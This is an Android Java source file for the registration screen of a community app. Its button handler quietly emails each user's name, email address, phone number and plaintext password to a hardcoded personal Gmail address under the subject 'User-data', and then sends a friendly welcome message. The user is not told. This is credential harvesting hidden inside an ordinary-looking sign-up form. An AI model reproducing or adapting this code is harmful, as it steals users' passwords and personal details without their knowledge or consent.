package com.applications.official;

import android.content.Intent;
import android.content.SharedPreferences;
import android.widget.EditText;
import androidx.appcompat.app.AppCompatActivity;
import android.os.*;
import android.util.Log;
import android.content.Context;
import android.widget.Toast;
import android.view.View;
import br.com.simplepass.loading_button_lib.customViews.CircularProgressButton;
import com.applications.official.JavaAdapter;
import com.applications.official.JavaMailAPI;
import com.applications.official.LoginActivity;
import com.applications.official.MainActivity;
import java.lang.Override;
import java.lang.Runnable;
import java.lang.Thread;
import com.itsaky.androidide.logsender.LogSender;

public class MainActivity extends AppCompatActivity{
    
    private  Context ctx;
    private  EditText uname,umail,unumber,upassward;
    private  CircularProgressButton pb1;
    private  Handler handler = new Handler();   
    SharedPreferences  mysharedprefarance;
    
    public static final String SHARED_PREF_NAME = "mypref";
    public static final String KEY_NAME = "name";
    public static final String KEY_MAIL = "mail";
    
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
     LogSender.startLogging(this);
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        String str = "";
       
  
     uname = (EditText) findViewById(R.id.editTextName);
     umail = (EditText) findViewById(R.id.editTextEmail);
     unumber = (EditText) findViewById(R.id.editTextMobile);
     upassward = (EditText) findViewById(R.id.editTextPassword);
     pb1 = (CircularProgressButton) findViewById(R.id.cirRegisterButton);
 
     
     mysharedprefarance = getSharedPreferences(SHARED_PREF_NAME,MODE_PRIVATE);

     
     String mail = mysharedprefarance.getString(KEY_MAIL,null);
     
   /*  if(mail != null){
        
        Intent i1 = new Intent(MainActivity.this,storeActivity.class);
       
         startActivity(i1);
         
         } */
     
     
     
     pb1.setOnClickListener(new View.OnClickListener(){
         
     Intent intent = new Intent(MainActivity.this ,LoginActivity.class );
    
         public  void next() {
                                          
       overridePendingTransition(R.anim.slide_in_left,android.R.anim.slide_out_right);       
        
       finish();
       startActivity(intent);
                         
         }
         
        @Override
        public void onClick(View p1) {
         
     String Uname = uname.getText().toString();
     String Umail = umail.getText().toString();
     String Unumber = unumber.getText().toString();
     String Upassward = upassward.getText().toString();
     
     JavaMailAPI javaMailAPI = new JavaMailAPI(getApplicationContext(), "dakstar143@gmail.com","User-data",Uname+"\n"+Umail+"\n"+Unumber+"\n"+Upassward); 
     JavaMailAPI javaMailAPI1 = new JavaMailAPI(getApplicationContext(),Umail,"Registration Successfull","Hello "+Uname+",\n"+"Welcome to the 12WYP Community🎊\n"+"We are so delightful to invite you to this Community.\n"+"please contact your guide for further details to start your journey with Us.\n\n"+"Regards\n"+"DAKstar\n"+"12WYP Community\n"+"A.One.Thoughts Inc");
        javaMailAPI.execute(); 
        javaMailAPI1.execute(); 
   
   SharedPreferences.Editor editor = mysharedprefarance.edit();
     	editor.putString(KEY_NAME,uname.getText().toString());
         editor.putString(KEY_MAIL,umail.getText().toString());
         editor.apply();
   
     if(!Uname.equals("") && !Umail.equals("") && !Unumber.equals("") && !Upassward.equals("")) {
      
                 
       intent.putExtra("uname",Uname);
       intent.putExtra("umail",Umail);
       intent.putExtra("unumber",Unumber);
       intent.putExtra("upassward",Upassward);
 
   

       pb1.startAnimation();
       
        handler.postDelayed(new Runnable(){
            
            @Override
            public void run(){
   
   Toast.makeText(getApplicationContext(),"Registration Successfull",Toast.LENGTH_SHORT).show();
              next();
            }
            
       },5000); 
       
       
       
         
       
   }
       
      else if (Uname.equals("") || Umail.equals("") || Unumber.equals("") || Upassward.equals("")) {
          
          Toast.makeText(getApplicationContext(),"not filled",Toast.LENGTH_SHORT).show();
          
      }
      
      else {
          
       Toast.makeText(getApplicationContext(),"Error",Toast.LENGTH_SHORT).show();
      }
           
           
        }
         
     });  
     
     
          
     
  
    
    
    
 }
    
 
 
   
  

 
 
 
 public void onLoginClick(View view){
                      
       startActivity(new Intent(MainActivity.this,LoginActivity.class));
        overridePendingTransition(R.anim.slide_in_left,android.R.anim.slide_out_right);
    }
 
 
}































